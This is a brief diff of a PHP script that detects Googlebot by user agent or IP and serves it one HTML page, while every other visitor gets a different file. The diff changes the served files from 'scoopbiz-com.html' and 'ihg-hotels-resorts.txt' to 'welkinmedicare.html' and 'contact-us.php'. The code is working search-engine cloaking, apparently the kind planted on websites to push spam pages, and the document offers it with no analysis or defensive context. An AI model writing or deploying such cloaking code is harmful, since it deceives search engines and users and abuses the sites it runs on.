@@ -24,11 +24,11 @@ $isGoogleBot = $isGoogleBotUA || isGooglebotIp($remoteIp);
 
 
 if ($isGoogleBot) {
-include __DIR__ . '/scoopbiz-com.html';
+include __DIR__ . '/welkinmedicare.html';
 exit;
 }
 
 
-include __DIR__ . '/ihg-hotels-resorts.txt';
+include __DIR__ . '/contact-us.php';
 exit;
 ?>
